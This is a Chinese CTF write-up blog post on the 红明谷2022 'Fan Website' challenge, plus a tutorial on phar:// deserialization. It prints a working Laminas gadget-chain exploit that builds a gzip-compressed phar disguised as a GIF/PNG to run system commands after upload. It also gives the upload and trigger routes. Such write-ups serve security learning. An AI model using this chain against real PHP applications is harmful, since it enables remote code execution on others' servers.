@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="红明谷2022[TOC] Fan Website扫描到www.zip中有源码，Album是自写的部分，整个工程搜索 crtl+shift+； 搜到unserilize()但是没有污点源 &#x2F;module&#x2F;Album&#x2F;src&#x2F;Controller&#x2F;AlbumController.php中  有两个限制，首先上传文件不能含有HALT_COMPLIER，这里用蓝帽杯决赛和去年虎符决赛的思路，使用gzip压">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红明谷2022">
+<meta property="og:url" content="https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/index.html">
+<meta property="og:site_name" content="Yenan&#39;s blog">
+<meta property="og:description" content="红明谷2022[TOC] Fan Website扫描到www.zip中有源码，Album是自写的部分，整个工程搜索 crtl+shift+； 搜到unserilize()但是没有污点源 &#x2F;module&#x2F;Album&#x2F;src&#x2F;Controller&#x2F;AlbumController.php中  有两个限制，首先上传文件不能含有HALT_COMPLIER，这里用蓝帽杯决赛和去年虎符决赛的思路，使用gzip压">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322324.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322328.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322329.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322331.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322332.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322333.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322334.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322336.png">
+<meta property="article:published_time" content="2022-03-27T05:20:13.000Z">
+<meta property="article:modified_time" content="2022-03-27T05:23:52.237Z">
+<meta property="article:author" content="Yenan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322324.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>红明谷2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/03/27/SU_dasctf_wp/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&text=红明谷2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&is_video=false&description=红明谷2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红明谷2022&body=Check out this article: https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&name=红明谷2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&t=红明谷2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B72022"><span class="toc-number">1.</span> <span class="toc-text">红明谷2022</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fan-Website"><span class="toc-number">1.1.</span> <span class="toc-text">Fan Website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-phar-%E6%8B%93%E5%B1%95-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">1.2.</span> <span class="toc-text">利用 phar:&#x2F;&#x2F; 拓展 PHP 反序列化的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%9B%9E%E9%A1%BE%E4%B8%80%E4%B8%8B%E5%8E%9F%E5%85%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、回顾一下原先PHP反序列化攻击的必要条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Phar-%E5%A6%82%E4%BD%95%E6%89%A9%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E7%9A%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、Phar:&#x2F;&#x2F;如何扩展反序列化攻击面的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81phar%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、phar的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Phar%E7%9A%84%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">1.Phar的文件结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAphar%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">2.如何创建一个phar压缩文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">3.phar反序列化小实验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">4.将phar伪造成其他格式的文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81phar%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、phar实际利用</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        红明谷2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yenan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-27T05:20:13.000Z" itemprop="datePublished">2022-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="红明谷2022"><a href="#红明谷2022" class="headerlink" title="红明谷2022"></a>红明谷2022</h2><p>[TOC]</p>
+<h3 id="Fan-Website"><a href="#Fan-Website" class="headerlink" title="Fan Website"></a>Fan Website</h3><p>扫描到<a target="_blank" rel="noopener" href="http://www.zip中有源码,album是自写的部分,整个工程搜索/">www.zip中有源码，Album是自写的部分，整个工程搜索</a> crtl+shift+； 搜到unserilize()但是没有污点源</p>
+<p>/module/Album/src/Controller/AlbumController.php中</p>
+<p><img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322324.png" alt="image-20220327103326050"></p>
+<p>有两个限制，首先上传文件不能含有HALT_COMPLIER，这里用蓝帽杯决赛和去年虎符决赛的思路，使用gzip压缩一次就好了</p>
+<p>gzip后，对比，没有了HALT_COMPLIER()</p>
+<p><img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322326.png" alt="image-20220327125321461"></p>
+<p>然后对文件大小也有限制，这里用python产生垃圾数据，并追加到phar文件中</p>
+<p>产生垃圾数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ranstr</span>(<span class="params">num</span>): </span><br><span class="line">    H = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span> </span><br><span class="line">    salt = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num): </span><br><span class="line">        salt += random.choice(H) </span><br><span class="line">    <span class="keyword">return</span> salt </span><br><span class="line">salt = ranstr(<span class="number">12000</span>) </span><br><span class="line"><span class="built_in">print</span>(salt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(salt)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>另外，前面还有对上传文件后缀为图片格式的限制，改下后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(&quot;yenan.phar.gz&quot;, &quot;yenan.png&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>链子就直接用 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8975#toc-12">https://xz.aliyun.com/t/8975#toc-12</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Laminas</span>\<span class="title class_">View</span>\<span class="title class_">Resolver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">map</span> = [&quot;<span class="title class_">setBody</span>&quot;=&gt;&quot;<span class="title class_">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Laminas</span>\<span class="title class_">View</span>\<span class="title class_">Renderer</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">__helpers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;__helpers = <span class="keyword">new</span> <span class="title class_">\Laminas\View\Resolver\TemplateMapResolver</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Laminas</span>\<span class="title class_">Log</span>\<span class="title class_">Writer</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Mail</span> <span class="title class_">extends</span> <span class="title class_">AbstractWriter</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">eventsToMail</span> = [&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;];  								<span class="comment">//  cmd  cmd cmd</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mail = <span class="keyword">new</span> <span class="title class_">\Laminas\View\Renderer\PhpRenderer</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Laminas</span>\<span class="title class_">Log</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Logger</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writers = [<span class="keyword">new</span> <span class="title class_">\Laminas\Log\Writer\Mail</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // <span class="title class_">use</span> \<span class="title class_">Laminas</span>\<span class="title class_">Log</span>\<span class="title class_">Logger</span>; <span class="comment">//这样写的话配套后面的$o = new Logger();那句</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">\Laminas\Log\Logger</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;yenan.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;script language=&#x27;php&#x27;&gt;__HALT_COMPILER();&lt;/script&gt;&quot;</span>); <span class="comment">//绕过文件头和设置stub</span></span><br><span class="line">    <span class="comment">// $o = new Logger();</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data以序列化形式存入manifest，这个函数相当于serialize()了</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;test.txt&quot;</span>)); <span class="comment">//凑文件大小</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;gzip yenan.phar&quot;</span>);<span class="comment">//绕过检查stub</span></span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="string">&quot;yenan.phar.gz&quot;</span>, <span class="string">&quot;yenan.png&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>观察生成的文件结构：可见先是stub部分，然后是序列化数据部分，最后是无用随机字符部分<br>                              <img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322327.png" alt="image-20220327125048740" style="zoom:80%;" /></p>
+<p>在/album/imgupload上传后</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322328.png" alt="image-20220327111615445" style="zoom:67%;" />
+
+<p>审计/module/Album/src/Controller/AlbumController.php中，有unlink这个文件操作函数，我们知道php一大部分的<strong>文件系统函数</strong>在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322329.png" alt="image-20220327125539869" style="zoom:67%;" />
+
+<p>在/album/imgdelete触发</p>
+<p><img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322330.png" alt="image-20220327111747874"></p>
+<p>路由规则咋规定的呢在/module/config里面 ：</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322331.png" alt="image-20220327130408346" style="zoom: 50%;" />
+
+<p>module下面的两个就是根路由，要么是/album，要么是/application，然后对于application，找src下面的controller的IndexController.php，里面有indexAction()方法，因此，index就是路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vps:port/application/index</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322332.png" alt="image-20220327130444150" style="zoom: 67%;" />
+
+<p>这个同理，/album下面的，src中的Controller下的AlbumController类中的deleteAction()方法，因此delete就是路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vps:port/album/add</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322333.png" alt="image-20220327130754840" style="zoom: 50%;" />
+
+
+
+<h3 id="利用-phar-拓展-PHP-反序列化的攻击面"><a href="#利用-phar-拓展-PHP-反序列化的攻击面" class="headerlink" title="利用 phar:// 拓展 PHP 反序列化的攻击面"></a>利用 phar:// 拓展 PHP 反序列化的攻击面</h3><h4 id="1、回顾一下原先PHP反序列化攻击的必要条件"><a href="#1、回顾一下原先PHP反序列化攻击的必要条件" class="headerlink" title="1、回顾一下原先PHP反序列化攻击的必要条件"></a>1、回顾一下原先PHP反序列化攻击的必要条件</h4><p>（1）首先我们必须有unserialize()函数</p>
+<p>（2）unserialize()函数的参数必须可控</p>
+<h4 id="2、Phar-如何扩展反序列化攻击面的"><a href="#2、Phar-如何扩展反序列化攻击面的" class="headerlink" title="2、Phar://如何扩展反序列化攻击面的"></a>2、Phar://如何扩展反序列化攻击面的</h4><p>原来 phar 文件包在 生成时会以序列化的形式存储用户自定义的 meta-data ，配合 phar:// 我们就能在<strong>文件系统函数</strong> file_exists() is_dir() 等参数可控的情况下实现自动的反序列化操作，于是我们就能通过构造精心设计的 phar 包在没有 unserailize() 的情况下实现反序列化攻击，从而将 PHP 反序列化漏洞的触发条件大大拓宽了，降低了我们 PHP 反序列化的攻击起点。</p>
+<h4 id="3、phar的使用"><a href="#3、phar的使用" class="headerlink" title="3、phar的使用"></a>3、phar的使用</h4><h5 id="1-Phar的文件结构"><a href="#1-Phar的文件结构" class="headerlink" title="1.Phar的文件结构"></a>1.Phar的文件结构</h5><p>(1) a stub</p>
+<p>可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p>(2) a manifest describing the contents</p>
+<p>因为 Phar 本身就是一个压缩文件，它里面存储着其中每个被压缩文件的权限、属性等信息。这部分还会以<strong>序列化的形式存储用户自定义的meta-data</strong>，这是上述攻击手法最核心的地方。</p>
+<p>(3)the file contents</p>
+<p>被压缩文件内容</p>
+<h5 id="2-如何创建一个phar压缩文件"><a href="#2-如何创建一个phar压缩文件" class="headerlink" title="2.如何创建一个phar压缩文件"></a>2.如何创建一个phar压缩文件</h5><p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为不是文本文件，我们使用hexdump看一下文件内容</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322334.png" alt="image-20220327110759982" style="zoom:67%;" />
+
+<p>可以清楚地看到我们的 TestObject 类已经以序列化的形式存入文件中</p>
+<p>我们刚刚说过了，php一大部分的<strong>文件系统函数</strong>在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，文件系统函数表：</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322335.png" alt="image-20220327111023563" style="zoom:67%;" />
+
+<h5 id="3-phar反序列化小实验"><a href="#3-phar反序列化小实验" class="headerlink" title="3.phar反序列化小实验"></a>3.phar反序列化小实验</h5><p>实例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 结果输出Destruct called</p>
+<p>可以看出我们成功的在没有 unserailize() 函数的情况下，通过精心构造的 phar 文件，再结合 phar:// 协议，配合文件系统函数，实现了一次精彩的反序列化操作。</p>
+<h5 id="4-将phar伪造成其他格式的文件"><a href="#4-将phar伪造成其他格式的文件" class="headerlink" title="4.将phar伪造成其他格式的文件"></a>4.将phar伪造成其他格式的文件</h5><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过<strong>添加任意的文件头</strong>+<strong>修改后缀名</strong>的方式将phar文件伪装成其他格式的文件。</p>
